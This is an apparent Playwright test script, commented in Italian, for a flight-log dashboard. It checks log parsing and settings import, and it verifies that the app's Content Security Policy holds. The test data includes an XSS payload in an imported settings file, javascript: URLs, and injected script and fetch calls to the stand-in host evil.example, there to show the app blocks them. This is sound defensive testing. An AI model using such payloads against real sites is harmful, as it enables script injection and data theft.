/* Test automatici di RZ Flight Dashboard (Playwright + Chromium).
   Uso:  node tests/run.mjs        (dalla cartella principale; serve Playwright: npm i -g playwright)
   Avvia un piccolo server locale, apre l'app e verifica i casi sui file di esempio. Esce con codice 1 se qualcosa fallisce. */
import { createRequire } from "module";
import crypto from "crypto"; import os from "os";
import http from "http"; import fs from "fs"; import path from "path"; import { fileURLToPath } from "url";
const require = createRequire(process.env.PW_PATH || "/opt/node22/lib/node_modules/");
const { chromium } = require("playwright");
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const mime = { ".html": "text/html", ".js": "text/javascript", ".json": "application/json", ".png": "image/png" };
const srv = http.createServer((q, r) => { const f = path.join(root, q.url === "/" ? "index.html" : decodeURIComponent(q.url.split("?")[0]));
  fs.readFile(f, (e, d) => { if (e) { r.writeHead(404); r.end(); } else { r.writeHead(200, { "content-type": mime[path.extname(f)] || "text/plain" }); r.end(d); } }); });
await new Promise(res => srv.listen(0, res));
const url = "http://localhost:" + srv.address().port + "/";
const E = p => path.join(root, "esempi", p);
let fails = 0; const ok = (c, m) => { console.log((c ? "  ok   " : "  FAIL ") + m); if (!c) fails++; };

// CSP: l'hash dello script inline nella meta deve essere quello attuale (altrimenti l'app resta vuota)
{ const html = fs.readFileSync(path.join(root, "index.html"), "utf8"); const sc = html.match(/<script>([\s\S]*?)<\/script>/)[1];
  const h = "sha256-" + crypto.createHash("sha256").update(sc, "utf8").digest("base64");
  console.log("CSP"); ok(html.includes("'" + h + "'"), "hash dello script aggiornato (se fallisce: python3 tools/csp.py)"); }
const b = await chromium.launch(); const p = await b.newPage({ viewport: { width: 1400, height: 1000 } });
const errs = []; p.on("pageerror", e => errs.push(e.message)); p.on("dialog", d => { errs.push("dialog: " + d.message().slice(0, 50)); d.accept(); });
const fresh = async () => { await p.goto(url); await p.waitForTimeout(400); };
const load = async files => { await p.setInputFiles("#file", files); await p.waitForTimeout(1500); };
const text = async sel => (await p.textContent(sel)).replace(/\s+/g, " ");
await p.addInitScript(() => document.addEventListener("securitypolicyviolation", e => (window.__v = window.__v || []).push(e.violatedDirective + " | " + e.blockedURI)));
await p.goto(url); await p.waitForTimeout(400);

console.log("NMEA (SM GPS)");
await load(E("volo-completo-test.nmea"));
await p.click("text=Polare"); await p.waitForTimeout(500);
ok(/Sink minimo 0,3\d m\/s/.test(await text("body")), "polare: sink minimo ~0,35 m/s");
await p.click("text=Analisi volo"); await p.waitForTimeout(400);
const sc = +(await text("#scoreBody")).match(/(\d+) \/100/)[1];
ok(sc >= 40 && sc <= 90, "indice di volo plausibile (" + sc + ")");

console.log("Jeti sintetico");
await fresh();
await load(E("volo-completo-test.log"));
await p.click("text=Analisi volo"); await p.waitForTimeout(400);
ok(/Regolatore.*Mezon 90/.test(await text("#flightHead")), "assetto: regolatore Mezon 90");
ok(/Modalità di volo/.test(await text("#anaTiles")) && /Termica/.test(await text("#anaTiles")), "fasi di volo da interruttori Sa/Sb");
ok(/Calo qualità collegamento/.test(await text("#radioEv")), "evento radio: calo di Q rilevato");

console.log("Unione Jeti + NMEA");
await fresh();
await load([E("volo-completo-test.log"), E("volo-completo-test.nmea")]);
const fname = await text("#fname"); const m = fname.match(/\(([+-]?[\d,]+) s, r=([\d,]+)\)/);
ok(!!m && Math.abs(parseFloat(m[1].replace(",", ".")) - 37.4) < 0.5, "offset ritrovato ~ +37,4 s (" + (m && m[1]) + ")");
ok(!!m && parseFloat(m[2].replace(",", ".")) > 0.95, "correlazione > 0,95");
await p.click("text=Polare"); await p.waitForTimeout(500);
ok(/Sink minimo/.test(await text("body")), "volo unito: polare disponibile");

console.log("GPS RZ (CSV a 1 Hz)");
await fresh();
await load(E("volo-completo-rzgps.csv"));
ok(/RZ GPS/.test(await text("#flightHead")), "riconosciuto come GPS RZ");
await p.click("text=Polare"); await p.waitForTimeout(500);
ok(/Sink minimo 0,[2-5]\d m\/s/.test(await text("body")), "polare dal CSV 1 Hz (sink minimo plausibile)");
await p.click("text=Analisi volo"); await p.waitForTimeout(400);
ok(/Quota max|Quota massima/i.test(await text("#anaTiles")), "analisi volo disponibile");
await fresh();
await load([E("volo-completo-test.log"), E("volo-completo-rzgps.csv")]);
ok(/uniti/.test(await text("#fname")), "unione Jeti + GPS RZ");

console.log("Interruttori impostabili");
await p.click("#setupBtn"); await p.waitForTimeout(300);
ok(await p.locator("#phRow select").count() === 6, "impostazioni interruttori presenti");

console.log("Esporta / importa impostazioni");
await fresh();
await p.evaluate(() => { localStorage.setItem("fd_mode", "light"); localStorage.setItem("fd_lang", "en");
  localStorage.setItem("jeti_reports", JSON.stringify([{ name: "Mio report", x: "__t__", y: ["Rel. altit", "Vario"], type: "line", colors: ["#112233", null] }])); });
await p.reload(); await p.waitForTimeout(500); await p.click("#setupBtn"); await p.waitForTimeout(300);
const [dl] = await Promise.all([p.waitForEvent("download"), p.click("#bkExport")]);
const exp = JSON.parse(fs.readFileSync(await dl.path(), "utf8"));
ok(exp.format === "rz-flight-settings" && exp.data.mode === "light" && exp.data.reports.length === 1 && exp.data.lang === "en", "esportazione: file con impostazioni e report");
const evil = { format: "rz-flight-settings", version: 1, data: { lang: "xx", mode: "dark", map: "javascript:1", logo: "javascript:alert(1)",
  theme: { "--accent": "#ff0000", "--bg": "url(evil)" },
  reports: [{ name: '<img src=x onerror="window.__pwn=1">', x: "__t__", y: ["Vario"], type: "line", colors: ["#00ff00"] },
            { name: "tipo falso", x: "__t__", y: ["Vario"], type: "script" }, { name: 5, x: "a", y: [] }, "stringa"],
  phases: { a: "Comando Sa", low: 9, bOn: 4 } } };
const tmp = path.join(os.tmpdir(), "rz-evil-settings.json"); fs.writeFileSync(tmp, JSON.stringify(evil));
await p.setInputFiles("#bkFile", tmp); await p.waitForTimeout(2500);
const st = await p.evaluate(() => ({ lang: localStorage.getItem("fd_lang"), mode: localStorage.getItem("fd_mode"), map: localStorage.getItem("fd_map"), logo: localStorage.getItem("fd_logo"),
  theme: localStorage.getItem("fd_theme"), rep: JSON.parse(localStorage.getItem("jeti_reports") || "[]"), ph: JSON.parse(localStorage.getItem("fd_phases") || "{}"), pwn: window.__pwn || 0 }));
ok(st.lang === "en" && st.map === null && st.logo === null, "importazione: lingua/mappa/logo non validi scartati");
ok(st.mode === "dark" && st.theme === '{"--accent":"#ff0000"}', "importazione: aspetto valido applicato, colore non valido scartato");
ok(st.rep.length === 1 && st.rep[0].type === "line" && st.rep[0].colors[0] === "#00ff00", "importazione: report malformati scartati, quello valido tenuto");
ok(st.ph.low === 2 && st.ph.bOn === 4 && st.ph.a === "Comando Sa", "importazione: interruttori con valori fuori scala corretti");
await p.click("#setupBtn"); await p.waitForTimeout(400);
ok((await p.evaluate(() => window.__pwn || 0)) === 0, "importazione: nome di report con codice non eseguito");
fs.unlinkSync(tmp);

console.log("Archivio (senza cartella)");
const jeti = fs.readFileSync(E("volo-completo-test.log"), "latin1");
await p.evaluate(t => { window.__rz.addFlight(t, "2026-10-01_a.log", "Prova"); window.__rz.addFlight(t, "2026-10-02_b.log", "Prova"); }, jeti);
await p.click('.tab[data-p="ar"]'); await p.waitForTimeout(500);
ok(/(Miglior volo registrato|Best recorded flight): \d+/.test(await text("#arBest")), "miglior volo registrato mostrato");
ok(!(await p.locator("#tdCard").isHidden()), "grafico andamento visibile con 2 voli");

const viol = await p.evaluate(() => window.__v || []);
ok(viol.length === 0, "nessuna violazione della CSP nell'uso normale" + (viol.length ? ": " + viol.join(" | ") : ""));
await p.evaluate(() => { window.__v = []; window.__pwn = 0;
  document.body.insertAdjacentHTML("beforeend", '<img src=x onerror="window.__pwn=1">');
  const s = document.createElement("script"); s.textContent = "window.__pwn=2"; document.body.appendChild(s);
  const e = document.createElement("script"); e.src = "https://evil.example/x.js"; document.body.appendChild(e);
  fetch("https://evil.example/steal").catch(() => {}); });
await p.waitForTimeout(500);
ok((await p.evaluate(() => window.__pwn)) === 0, "CSP: gestore inline e script iniettato non vengono eseguiti");
ok((await p.evaluate(() => window.__v)).length >= 3, "CSP: blocca script inline, script esterno e richieste verso altri siti");
ok(errs.length === 0, "nessun errore JavaScript" + (errs.length ? ": " + errs.join(" | ") : ""));
await b.close(); srv.close();
console.log(fails ? `\n${fails} test FALLITI` : "\nTutti i test superati"); process.exit(fails ? 1 : 0);
